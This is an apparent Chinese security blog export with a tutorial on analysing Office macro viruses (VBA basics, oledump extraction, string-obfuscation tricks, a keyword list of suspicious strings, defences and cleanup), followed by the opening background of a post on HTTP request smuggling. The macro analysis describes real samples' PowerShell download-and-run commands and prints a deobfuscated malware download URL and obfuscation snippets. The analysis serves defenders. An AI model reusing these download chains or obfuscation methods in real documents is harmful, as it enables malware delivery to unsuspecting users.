    <content><![CDATA[<p><strong>宏病毒的研究和学习</strong></p>
<p><strong>1.绪论</strong></p>
<p>宏病毒是一种常见的计算机病毒，寄存在文档或者模板中，但是并不会直接感染可执行程序。其诞生于上世纪90年代，自其诞生之日，各种各样的宏病毒不断在网络上涌现。早期的宏病毒是病毒先驱者们展现高超技术的舞台，只感染文档文件，随着时间的推移，宏病毒的危害也越来越大，宏病毒不再只是感染文档文件，而成为了分发恶意程序的常规途径。宏病毒的执行简易隐蔽快速，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行。</p>
<p>对于攻击者而言，宏病毒是一把利器，尤其是结合了社会工程学的宏病毒。如乌克兰电网事件（BlackEnergy）,工作人员只是打开了一篇看似很正常的文档，然后便造成了无法挽回的损失。不只是BlackEnergy，进来肆虐的各种各样的勒索软件，都离不开Office宏的帮助。借助传统的宏病毒，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行，释放并激活恶意软件</p>
<p><strong>2.基础知识</strong></p>
<p>宏（英文Macro），广义上的定义是：宏就是把一系列的指令组织成一独立的命令，类似C语言中#define宏定义，避免同一动作的一再重复；侠义上，宏特指office系列办公软件中的宏，Microsoft Office</p>
<p>中对宏的定义为“宏就是能够组织在一起的，可以作为一个独立命令来执行的一些列Word命令，他能使日常工作变得容易。”本文中提到的宏属于狭义的定义，即office办公软件中的宏。</p>
<p>首先office对于宏的管理如下图所示：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16569.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16571.png" alt="0"></p>
<p>正常情况下offic会弹出相应的宏被禁用的通知，点击启用内容即可查看</p>
<p>或者按下ALT+F11也可以看到相应的宏程序</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16580.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16582.png" alt="0"></p>
<p>该例中的宏十分简单，其作用就是弹出一个对话框。</p>
<p>执行恶意功能的宏就是宏病毒</p>
<p>宏病毒是使用宏语言编写的恶意程序，存在于字处理文档、电子数据表格、数据库、演示文档等数据文件中，可以在office系列办公软件中运行，利用宏的功能能将自己复制到其他数据文件中。宏病毒感染的是数据文件。宏病毒于传统的病毒有很大的不同，他不感染可执行文件，而是潜伏在Microsoft Office文档中，一旦用户打开含有宏的文档，其中的宏就会被执行。宏是使用VBA编写的，编写过程简单，任何人只需掌握一些基本的宏编写技能就可以编写出破坏力巨大的宏病毒。</p>
<p>宏病毒的强大是建立在强大的VBA组件的基础上的。同时，宏病毒于系统平台无关，任何计算机如果能够运行Microsoft Office办公软件，都有可能感染宏病毒。随着Microsoft Office系列办公软件成为电子文档的工业标准，word，excel和powerpoint等已成为个人计算机和互联网上广泛使用的文档格式，宏病毒成为传播最广泛，危害最大的一类病毒。</p>
<p>根据文档载体的不同，宏病毒可以细分为很多种，Word、Excel、Access、PowerPoint等都有相应的宏病毒。</p>
<p><strong>2.2VB基础</strong></p>
<p>（1）sub与function</p>
<p>上述宏代码中，含有一个Sub和一个Function。sub和function都类似于C中的函数。sub在VB中被称为过程，function被称为函数；sub没有返回值，function有返回值；一段宏一定是从sub开始执行的。在demo3中定义了一个过程 autoopen()，“End Sub”表示这个过程的结束。</p>
<p>（2）VB基本函数</p>
<p>demo3 中“MsgBox ActiveDocument.BuiltInDocumentProperties(5)”调用了VB基本函数“MsgBox”，参数是”ActiveDocument.BuiltInDocumentProperties(5)”。这里实际上是“MsgBox (参数)”，但是VBA的容错率较高，不写括号，宏代码依然能够执行。即使我们将“MsgBox”写成“MSgbOx”，宏代码依然能够执行。一些宏病毒就是使用大小写混淆，增加病毒分析难度。</p>
<p>除了MsgBox，VB中还有很多基本函数，各位可以百度“VB函数大全”。</p>
<p>（3）对象</p>
<p>VB中存在很多对象，如Application对象，Document对象，Adobd.stream对象等。对象实际上是代码和数据的组合，我们在使用对象时，要么使用对象的属性（就是数据），要么使用对象的方法（就是代码）。通过 “对象.属性/方法”的方式使用对象的属性/方法。ActiveDocument.BuiltInDocumentProperties(5)中就是使用了ActiveDocument对象的BuiltInDocumentProperties()方法，参数是5。</p>
<p><strong>3.宏病毒实例分析</strong></p>
<p><strong>3.1 实例1</strong></p>
<p> demo2.doc    这里是社会工程学攻击</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16619.png" alt="0"></p>
<p>ALT+F11打开VBA编辑器，查看宏代码。但是你会发现，此时工程里没有数据，这是没有单击“启用内容”，VBA工程还没有加载</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16628.png" alt="0"></p>
<p>利用VBA_Password_Bypasser重新打开demo2.doc,再次打开VBA编辑器查看宏代码，宏代码一览无余：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16636.png" alt="0"></p>
<p>这段宏首先拼接了一段字符串CGJKIYRSDGHJHGFFG，这段字符串是一段命令，接下来就调用Shell() ，执行这段命令。</p>
<p>但是CGJKIYRSDGHJHGFFG的内容经过混淆，我们没办法一眼看出执行了什么命令，我们可以改造宏代码，使用Msgbox将CGJKIYRSDGHJHGFFG这段命令打印出来：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16640.png" alt="0"></p>
<p>现在就一目了然了，这段cmd命令执行了两段powershell命令，第一段powershell命令是从’<a href="http://skycpa.in/file.php&#39;中下载文件，并另存为&#39;%TEMP%\Y.ps1&#39;，第二段powershell命令就是执行Y.ps1，关于Y.ps1的分析不属于宏病毒的范畴，这里就不做分析了。">http://skycpa.in/file.php&#39;中下载文件，并另存为&#39;%TEMP%\Y.ps1&#39;，第二段powershell命令就是执行Y.ps1，关于Y.ps1的分析不属于宏病毒的范畴，这里就不做分析了。</a></p>
<p><strong>3.2 oledump.py</strong></p>
<p>在之前的分析中，我们先启用宏，然后打开VBA编辑器分析宏代码。这个时候我们不仅可以直观的看到宏代码，还可以动态调试。但是，我们选择启用宏后，宏代码就会运行，如果存在恶意行为，恶意行为就会执行。这样的分析方式存在一定的风险，那么，有没有一种方式，不运行宏就能查看宏代码呢？当然有，那就是oledump.py(<a href="https://github.com/decalage2/oledump-contrib)。">https://github.com/decalage2/oledump-contrib)。</a></p>
<p>oledump.py是一个用于分析OLE文件（复合文件二进制格式）的程序，我们可以使用它提取文档中的宏代码。其查找基于二进制文件格式的文件中的内容的流程：</p>
<p>  1.读取文件流。</p>
<p>  2.识别可能包含要查找的内容的结构。</p>
<p>  3.通过第一个结构，找到下一节的位置。</p>
<p>  4.在流中转到该节。</p>
<p>  5.重复前面两个步骤，直到找到所需的内容。</p>
<p>  6.读取并分析内容。</p>
<p>python oledump.py yangben.doc</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16652.png" alt="0"></p>
<p>这是oledump对doc文件的最基础的分析，显示了这个文件的Stream数据（在接下来的章节中我们会进行介绍Stream），一共包含18段，其中8这一段数据上标记了字母‘M’，表示这段数据中含有VBA宏（Macro）。</p>
<p>oledump.py有许多参数可以选择，使用oledump.py -m 可以查看oledump.py 的帮助信息，这里我们要用到的参数是-s和-v</p>
<p><strong>-s 段号：选择上分析出的某一段来查看内容</strong></p>
<p><strong>-v        ：解压缩VBA宏</strong></p>
<p>上面两个参数结合起来用就可以找出宏源码：</p>
<p>python oledump.py -s -A3 -v -yangben2.doc</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16683.png" alt="0"></p>
<p>可以看到宏代码被解析出来了。</p>
<p>在实际分析时，-s后的参数可以选择‘a’，表示分析所有段的数据，还可以使用‘&gt;’符号将宏代码数据存储在新文件中</p>
<p><strong>decoder_ay.py和-d参数</strong>，它可以将文件中的exe数据dump下来。有一些文档宏存储了exe数据，这个时候我们就可以使用下列命令，将文档中的exe数据导出：</p>
<p>python oledump.py -s 14  -D decoder_ay.py -d 1.doc  &gt;1.exe</p>
<p>如果我们只是想dump某一段数据，而不关心是不是exe数据，使用如下命令：</p>
<p>Oledump.py -s 段名 -d 文件名 &gt;新文件名</p>
<p><strong>4.宏病毒的分析技巧</strong></p>
<p><strong>4.1自动执行</strong></p>
<p>宏病毒分析的第一步是定位自动执行入口。</p>
<p>宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中宏病毒就会被执行，而用户一无所知。</p>
<p>宏病毒的激发机制有三种：利用自动运行的宏，修改Word命令和利用Document对象的事件。</p>
<p>宏病毒种常用的自动执行方法有两种：一种是用户执行某种操作时自动执行的宏，如Subbotton()，当用户单击文档种的按钮控件时，宏自动执行；另一种则是Auto自动执行，如Sub AutoOpen()和Sub AutoClose(),分别在文档打开和关闭时自动执行</p>
<p><strong>4.2 隐秘执行</strong></p>
<p>宏病毒利用几行代码就可以实现隐秘，宏病毒通过阻止弹出各类提示，防止用户发现宏正在运行来实现自我隐藏：</p>
<p>On Error Resume Next                 //如果发生错误，不弹出错误对话框</p>
<p>Application.DisplayStatusBar = False     //进制显示状态栏</p>
<p>Options.SaveNormalPrompt = False    //修改公用模板时自动保存，不弹出提示</p>
<p>宏病毒自我隐藏还有一种方式，那就是屏蔽菜单按钮和快捷键，普通用户即使猜测到有宏正在运行，也无法取消正在执行种的宏，查看宏信息。</p>
<p>下面是一些宏病毒采取的隐蔽执行的一些措施：</p>
<table>
<thead>
<tr>
<th>外部例程</th>
<th>介绍</th>
</tr>
</thead>
<tbody><tr>
<td>MSXML2.ServerXMLHTTP</td>
<td>Xmlhttp是一种浏览器对象， 可用于模拟http的GET和POST请求</td>
</tr>
<tr>
<td>Net.WebClient</td>
<td>提供网络服务</td>
</tr>
<tr>
<td>Adodb.Stream</td>
<td>Stream 流对象用于表示数据流。配合XMLHTTP服务使用Stream对象可以从网站上下载各种可执行程序</td>
</tr>
<tr>
<td>Wscript.shell</td>
<td>WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量。</td>
</tr>
<tr>
<td>Poweshell</td>
<td>PowerShell.exe 是微软提供的一种命令行shell程序和脚本环境</td>
</tr>
<tr>
<td>Application.Run</td>
<td>调用该函数，可以运行.exe文件</td>
</tr>
<tr>
<td>WMI</td>
<td>用户可以利用 WMI 管理计算机，在宏病毒中主要通过winmgmts:\.\root\CIMV2隐藏启动进程</td>
</tr>
<tr>
<td>Shell.Application</td>
<td>能够执行sehll命令</td>
</tr>
</tbody></table>
<p>可以使用Wscript.shell实现命令执行功能：</p>
<p><strong>Set oWshell = CreateObject（“WScript.Shell”）</strong></p>
<p><strong>If ValueType = “” Then</strong></p>
<p><strong>oWshell.RegWrite strkey,    Value</strong></p>
<p><strong>Else</strong></p>
<p><strong>oWshell.RegWrite strkey,    Value</strong></p>
<p><strong>oWshell.RegWrite strkey,    Value,    ValueType</strong></p>
<p><strong>End If</strong></p>
<p>上表种Wscript.shell、Powersehll、Application.Run、Shell.Application这些外部例程都可以用来执行命令，初次之外，一些API如：Shell()、CallWindowProc()也常用执行命令。</p>
<p><strong>4.4 字符串隐写</strong></p>
<p>宏病毒分析比较简单，这是因为任何能执行宏的用户都能查看宏源码，分析人员轻而易举就分析出宏病毒的行为。通过扫描宏种特征字符串，杀软也很容易检测出宏病毒。宏病毒的开发者们便想尽办法隐藏这些特征字符串，下面本文就对宏病毒中这些字符串的隐写方式进行分析。</p>
<p><strong>4.4.1.Chr( )函数</strong></p>
<p>Chr(),返回以数值表达式值为编码的字符（例如：Chr(70)返回字符‘F’）</p>
<p>使用Chr函数是最常见的字符串隐写结束，利用ascii码，逃避字符串扫描。</p>
<p>如下列代码：</p>
<p>Nrh1INh1S5hGed = “h” &amp; Chr(116) &amp; Chr(61) &amp; “t” &amp; Chr(112) &amp;Chr(58) &amp; Chr(47) &amp; Chr(59) &amp; Chr(47) &amp; Chr(99) &amp; Chr(104) &amp; Chr(97) &amp; “t” &amp; Chr(101) &amp; Chr(97) &amp; Chr(117) &amp; Chr(45) &amp; Chr(100) &amp; Chr(60) &amp; Chr(101) &amp; Chr(115) &amp; Chr(45) &amp; Chr(105) &amp; Chr(108) &amp; “e” &amp; Chr(115) &amp; Chr(46) &amp; Chr(61) &amp; Chr(99) &amp; Chr(111) &amp; Chr(109) &amp; Chr(47) &amp; Chr(60) &amp; Chr(52) &amp; Chr(116) &amp; Chr(102) &amp; Chr(51) &amp; Chr(51) &amp; Chr(119) &amp; Chr(47) &amp; Chr(60) &amp; Chr(119) &amp; “4” &amp; Chr(116) &amp; Chr(52) &amp; Chr(53) &amp; Chr(51) &amp; Chr(46) &amp; Chr(59) &amp; Chr(101) &amp; Chr(61) &amp; Chr(120) &amp; Chr(101)</p>
<p>上列代码使用了大量的Chr函数，看似很复杂，实际上就只是一串字符串“ht=tp:/;/chateau-d</p>
<p>Nrh1INh1S5hGed字符串看着很像一个链接，但是中间多了几个字符，其实处理起来很简单，只要将多余字符删掉就好。</p>
<p>将这串字符串命名为Nrh1INh1S5hGed也是为了混淆，但是对于宏病毒分析人员来说，这种混淆并没有增加分析难度，分析人员只需要 全选–查找–替换。</p>
<p>Chr（）函数还可以利用表达式，增加技术人员的分析难度：</p>
<p>Ndjs = Sgn(Asc(317 - 433) + 105）     </p>
<p>ATTH = Chr(Ndjs) + Chr(Ndjs + 12) + Chr(Ndjs + 12) + Chr(Ndjs + 8)</p>
<p>经过分析发现，上述代码的字符串是：“http：//”</p>
<p><strong>4.4.2.Replace( )函数</strong></p>
<p>Replace函数的作用就是替换字符串，返回一个新字符串，其中某个指定的字符串被另一个字符串代替。</p>
<p>承接上文，把Nrh1INh1S5hGed中多余字符去掉，这里使用Replace函数把多余字符替换为空。</p>
<p><strong>Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed,</strong></p>
<p>​                <strong>Chr(60), “”), Chr(61), “”), Chr(59), “”)</strong></p>
<p>处理之后：</p>
<p>Nrh1INh1S5hGed=“<a href="http://chateau-des-iles.com/4tf33w/w4t453.exe”">http://chateau-des-iles.com/4tf33w/w4t453.exe”</a></p>
<p>可以很清晰看出Nrh1INh1S5hGed是一个下载名为w4t453可执行文件的链接。可以猜测w4t453.exe是一个恶意程序，之后一定会执行w4t453.exe。在用户一无所知的情况下，宏已经完成了入侵工作。</p>
<p><strong>4.4.3.CallByname 函数</strong></p>
<p>CallByname函数允许使用一个字符串在运行时指定一个属性或方法。</p>
<p>CallByName    函数的用法如下：</p>
<p>Result = CallByName（Object， ProcedureName, CallType, Arguments()）</p>
<p>CallByName 的第一个参数包含要对其执行动作的对象名。第二个参数，ProcedureName,是第一个字符串，包含将要调用的方法或属性过程名。CallType参数包含一个常熟，代表要调用的过程的类型：方法（vbMethod）、property let (vbLet)、property get (vbGet),或 property set （vbSet）。最后一个参数是可选的，他包含一个变量数组，数组中包含该过程的参数。</p>
<p><strong>例如：</strong></p>
<p><strong>CallByName Text1, “Move”, vbMethod, 100, 100就相当于执行Text1.Move(100,10)</strong> 这种隐藏的函数执行增加了分析的难度。</p>
<p>CallByName的作用不仅仅在此，在下面的这个例子中，利用callByName，可以用脚本控制控件:</p>
<p>code：</p>
<p>Dim obj As Object[/align]        Set obj = Me</p>
<p>​       Set obj = CallByName(obj, “Text1”, VbGet)</p>
<p>​       Set obj = CallByName(obj, “Font”, VbGet)</p>
<p>​       CallByName obj, “Size”, VbLet, 50</p>
<p>​     ‘以上代码=”Me.Text1.Font.Size = 50”</p>
<p>​      Dim obj As Object</p>
<p>​       Dim V As String</p>
<p>​       Set obj = Me</p>
<p>​       Set obj = CallByName(obj, “Text1”, VbGet)</p>
<p>​       Set obj = CallByName(obj, “Font”, VbGet)</p>
<p>​       V = CallByName(obj, “Size”, VbGet)</p>
<p>​       ‘以上代码=”V = Me.Text1.Font.Size”</p>
<p><strong>4.4.4.Alias替换函数名</strong></p>
<p>Alias子句是一个可选的部分，用户可以通过它所标识的别名对动态库中的函数进行引用。</p>
<p><strong>Public Declare Function clothed Lib “user32” Alias “GetUpdateRect”</strong></p>
<p><strong>(prestigiation As Long, knightia As Long, otoscope As Long) As Boolean</strong></p>
<p>如上例所示，clothed作为GetUpdateRect的别名，调用clothed函数相当于调用user32库里的GetUpdateRect函数。</p>
<p>事实上喜欢使用别名的不仅仅是宏病毒制造者，普通的宏程序员也喜欢使用别名。使用别名的好处是比较明显的，一方面Visual Basic不允许调用以下划线为前缀的函数，然而在Win32 API函数中有大量C开发的函数可能以下划线开始。使用别名可以绕过这个限制。另外使用别名有利于用户命名标准统一。对于一些大小写敏感的函数名，使用别名可以改变函数的大小写。</p>
<p><strong>4.4.5.利用窗体、控件隐藏信息</strong></p>
<p>控件在宏程序里很常见，有些宏病毒的制造者们便想到利用控件隐藏危险字符串。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16842.png" alt="0"></p>
<p>如图所示，空间里存放着关键字符串，程序用到上述字符串时，只需要调用标签空间的caption属性</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16847.png" alt="0"></p>
<p>空间的各个属性（name、caption、controtiptext、等）都可以成为危险字符串的藏身之所。而仅仅查看宏代码，分析者无法得知这些字符串内容，分析者必须进入编辑器查看窗体属性，这大大增加了分析的难度。</p>
<p><strong>4.4.6.利用文件属性</strong></p>
<p>这种方式和利用窗体属性的方式类似，就是将一切能存储数据的地方利用起来。</p>
<p>如图所示读取的时ActiveDocument。BuiltinDocumentProperties Comments的数据，实际上就是文件备注信息里的数据，将这里的数据Base解密并执行。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16865.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16867.png" alt="0"></p>
<p><strong>4.5 恶意行为字符串</strong></p>
<p>不同的宏病毒执行不同的恶意行为，但这些恶意行为是类似的，他们使用的代码往往是相似的。通过大量的样本分析，笔者总结了一些宏病毒执行危险操作时代码中含有的字符串，详见下表：</p>
<table>
<thead>
<tr>
<th>字符串</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>http</td>
<td>URL连接</td>
</tr>
<tr>
<td>CallByName</td>
<td>允许使用一个字符串在运行时指定一个属性或方法，许多宏病毒使用CallByName执行危险函数</td>
</tr>
<tr>
<td>Powershell</td>
<td>可以执行脚本，运行.exe文件，可以执行base64的命令</td>
</tr>
<tr>
<td>Winmgmts</td>
<td>WinMgmt.exe是Windows管理服务，可以创建windows管理脚本</td>
</tr>
<tr>
<td>Wscript</td>
<td>可以执行脚本命令</td>
</tr>
<tr>
<td>Shell</td>
<td>可以执行脚本命令</td>
</tr>
<tr>
<td>Environment</td>
<td>宏病毒用于获取系统环境变量</td>
</tr>
<tr>
<td>Adodb.stream</td>
<td>用于处理二进制数据流或文本流</td>
</tr>
<tr>
<td>Savetofile</td>
<td>结合Adodb.stream用于文件修改后保存</td>
</tr>
<tr>
<td>MSXML2</td>
<td>能够启动网络服务</td>
</tr>
<tr>
<td>XMLHTTP</td>
<td>能够启动网络服务</td>
</tr>
<tr>
<td>Application.Run</td>
<td>可以运行.exe文件</td>
</tr>
<tr>
<td>Download</td>
<td>文件下载</td>
</tr>
<tr>
<td>Write</td>
<td>文件写入</td>
</tr>
<tr>
<td>Get</td>
<td>http中get请求</td>
</tr>
<tr>
<td>Post</td>
<td>http中post请求</td>
</tr>
<tr>
<td>Response</td>
<td>http中认识response回复</td>
</tr>
<tr>
<td>Net</td>
<td>网络服务</td>
</tr>
<tr>
<td>WebClient</td>
<td>网络服务</td>
</tr>
<tr>
<td>Temp</td>
<td>常被宏病毒用于获取临时文件夹</td>
</tr>
<tr>
<td>Process</td>
<td>启动进程</td>
</tr>
<tr>
<td>Cmd</td>
<td>执行控制台命令</td>
</tr>
<tr>
<td>createObject</td>
<td>宏病毒常用于创建进行危险行为的对象</td>
</tr>
<tr>
<td>Comspec</td>
<td>%ComSpec%一般指向你cmd.exe的路径</td>
</tr>
</tbody></table>
<p><strong>5 宏病毒的防御手段</strong></p>
<p>安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒，除此这些常规手段之外，宏病毒还有专门的防止措施。</p>
<p><strong>5.1 禁用宏</strong></p>
<p>由于宏病毒的肆虐，Microsoft不得不在Office办公软件中提供了禁止宏的功能，用户只需要将其打开激活即可再次运行宏。以word2013为例，禁用宏的方法是：单击开发工具菜单下的“宏”，单击“宏安全性”，在随后的出现的对话框中选择“禁用所有宏，并发出通知”。</p>
<p>这个方法一度被认为能防住所有的宏病毒，但是总会有0day能够绕过宏防护，禁用宏对于利用漏洞绕过宏禁用功能的宏病毒，仍然无能为力。</p>
<p>而且禁用宏功能还有两个很大的缺陷：一是它拒绝了一切的宏执行，并不区分正常的宏和还是病毒宏，这会造成某些文档无法打开或出错；二是宏病毒防护无法阻止启动word时Autoexec.DOT中的宏和Normal.DOT中的宏自动执行。</p>
<p><strong>5.2 越过自动宏</strong></p>
<p>如果怀疑文档中存在宏病毒，可以在Office打开文档的时候，始终按住Shift键，将进制存在的一起自动宏。这和禁止宏有异曲同工之妙，Shift键可以在退出时禁止任何AutoClose宏。这种方法的缺陷也很明显，它只能对付一时，当宏病毒利用其他菜单选项来实现破环活动，这种方法就不再有效</p>
<p><strong>5.3恢复被宏病毒破坏的文档</strong></p>
<p>对于普通用户来说，清理宏病毒显得麻烦，因为文档被宏病毒感染后（实际上是文档使用的模板文档被感染），使用文档时常常会出现一些异常情况，即使用杀毒软件将所有带毒的文档文件都处理一遍，但是，当重新打开它们时病毒又出现了。有些用户采用的是将Office卸载重装，但是有时候问题还是没有被解决。</p>
<p>其实，对于宏病毒的清理并不难，下面以删除Word宏病毒为例分步骤详细说明：</p>
<p>①　退出Word程序，先查看系统盘根目录下是否存在Autoexec.DOT文件，如果存在，而又不知道它是什么时候出现，则将其删除。</p>
<p>②　然后找到Normal.DOT文件，一般位于C:\Documents and Settings\ Administrator\Application Data\Microsoft\Templates目录下，用先前干净的备份将其替换，也可以直接删除，Word不会因为找不到Normal.DOT而拒绝启动，它会自动重新生成一个干净的没有任何外来宏的Noraml.DOT。</p>
<p>③　查看Noraml.DOT所在的目录中是否存在其他模板文件，如果存在且不是自己复制进去的，将其删除。</p>
<p>④　重新启动Word程序，查看Word是否恢复正常了。</p>
<p>⑤　最后检查宏病毒防护是否被启用了，某些病毒会自动禁用宏病毒防护功能，如果不启用禁用宏功能，Word会很快再次被病毒感染。</p>
<p>目前主流杀软在处理宏病毒时，都是直接删除含有宏病毒的文档，这样处理显得有些粗暴，将导致用户无法查看文档里的数据，如果时一些重要的业务数据，将造成业务数据的丢失，产生无法估计的后果。本文将介绍一种宏病毒处理思路，在不删除文档文件的情况下清楚宏病毒。在正式处理宏病毒前，我们必须对Office文档的数据结构以及宏的数据结构有着初步的了解</p>
<p><strong>6 符合文档（OLE文件）二进制解析</strong></p>
<p><strong>6.1复合文档数据结构解析</strong></p>
<p>Office文档（如：doc、ppt、xls）很多是复合文档（OLE文件），所有文件数据都是存储在一个活多个流中。每个流都有一个相似的数据结构，用于存储元数据的数据结构。这些元数据有客户和系统的信息、文档属性、格式信息、文本内容、媒体内容。宏代码信息也是以这种方式存储在复合文档中的。</p>
<p>为了在Office文档文件中提取宏代码，必须能够解析符合文档的二进制格式，下面以word威力，分析复合文档的二进制文件结构。</p>
<p><strong>6.1.1.准备工作</strong></p>
<p>①准备工作：</p>
<p>Office Visualization Tool:微软提供的office二进制格式查看工具，用于学习doc,xls,ppt等文档二进制格式；</p>
<p>010Editor：一款流行的二进制编辑器</p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>宏病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP请求走私协议分析</title>
    <url>/2020/09/12/WEB/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="HTTP请求走私协议分析"><a href="#HTTP请求走私协议分析" class="headerlink" title="HTTP请求走私协议分析"></a>HTTP请求走私协议分析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h3><p>HTTP协议是Hyper Text Transfer Protocol(超文本传输协议)：一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动</p>
<p>HTTP协议工作于客户端-服务端架构之上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191232407.png" alt="image-20200912191232407"></p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据(HTML 文件, 图片文件, 查询结果等)。</p>
<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p>在创建过程当中，三次握手就是代表着有三次网络传输，客户端发送一次，然后服务端返回一次，然后客户端再发送一次，这个时候才创建了tcp连接，然后才能去发送http请求</p>
<p>而HTTP1.0协议和HTTP1.1协议之所以不同，一部分也在于此：<br>在HTTP1.0里面，这个连接是在http请求创建的时候，就去创建这个tcp连接，然后连接创建完之后，请求发送过去，服务器响应之后，这个tcp连接就关闭了</p>
<p>在HTTP1.1协议中，可以用<code>Keep-Alive</code>方法去申明这个连接可以一直保持，那么第二个http请求就没有三次握手的开销，而且相较于HTTP1.0，HTTP1.1有了<code>Pipeline</code>，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p>
<h3 id="HTTP属性"><a href="#HTTP属性" class="headerlink" title="HTTP属性"></a>HTTP属性</h3><h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200 OK &#x2F;&#x2F;客户端请求成功</span><br><span class="line">400 Bad Request &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span><br><span class="line">403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务</span><br><span class="line">404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL</span><br><span class="line">500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误</span><br><span class="line">503 Server Unavailable &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</span><br></pre></td></tr></table></figure>

<h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept：</span><br><span class="line">表示浏览器支持的MIME类型</span><br><span class="line">Accept-Encoding：</span><br><span class="line">浏览器支持的压缩类型</span><br><span class="line">Accept-Language</span><br><span class="line">浏览器支持的语言类型，并且优先支持靠前的语言类型</span><br><span class="line">Connection</span><br><span class="line">当浏览器与服务器通信时对于长连接如何进行处理：close&#x2F;keep-alive</span><br><span class="line">Cookie</span><br><span class="line">向服务器返回cookie，这些cookie是之前服务器发给浏览器的</span><br><span class="line">Host：</span><br><span class="line">请求的服务器URL</span><br><span class="line">User-Agent：</span><br><span class="line">用户使用的客户端的一些必要信息，比如操作系统、浏览器及版本、浏览器渲染引擎等。</span><br><span class="line">判断是否为ajax请求如果没有该属性则说明为传统请求</span><br></pre></td></tr></table></figure>

<h4 id="响应头："><a href="#响应头：" class="headerlink" title="响应头："></a>响应头：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server，服务端所使用的Web服务名称，如：Server：Apache&#x2F;1.3.6(Unix)。</span><br><span class="line">Set-Cookie：服务器向客户端设置的Cookie。</span><br><span class="line">Last-Modified，服务器通过这个域告诉客户端浏览器，资源的最后修改时间。</span><br><span class="line">Location：重定向用户到另一个页面，比如身份认证通过之后就会转向另一个页面。这个域通常配合302状态码使用。</span><br><span class="line">Content-Length：body部分的长度（单位字节）。</span><br></pre></td></tr></table></figure>

<h2 id="发展时间线"><a href="#发展时间线" class="headerlink" title="发展时间线"></a>发展时间线</h2><p>最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p>
<blockquote>
<p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p>
</blockquote>
<p>在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p>
<blockquote>
<p>[<a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]</a>(<a href="https://media.defcon.org/DEF">https://media.defcon.org/DEF</a> CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf)</p>
</blockquote>
